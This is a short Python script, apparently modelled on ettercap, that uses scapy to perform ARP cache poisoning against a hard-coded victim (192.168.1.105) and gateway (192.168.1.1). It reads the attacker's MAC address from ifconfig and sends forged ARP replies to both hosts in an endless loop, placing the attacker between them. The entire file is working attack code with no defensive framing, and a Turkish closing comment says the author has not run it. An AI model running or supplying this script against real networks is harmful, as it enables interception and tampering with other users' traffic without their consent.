#ettercap tool
from scapy.all import *
import subprocess

hedef_ip = '192.168.1.105'
gateway_ip = '192.168.1.1'

ifconfigResult = subprocess.check_output("ifconfig eth0", shell=True,).decode()
attacker_mac = re.search("ether(.*?)txqueuelen", ifconfigResult).group(1).strip()

eth = Ether(src=attacker_mac,)
h_arp = ARP(hwsrc=attacker_mac, psrc=gateway_ip, pdst=hedef_ip)
g_arp = ARP(hwsrc=attacker_mac, psrc=hedef_ip, pdst=gateway_ip)

"""for i in range(10):
    sendp(eth/h_arp)
    sendp(eth/g_arp)
"""

while True:
    try:
        sendp(eth/h_arp, verbose=False)
        sendp(eth/g_arp, verbose=False)
    except KeyboardInterrupt:
        print("Arp Poising Stop")
        break

#Kodu çalıştırmadım.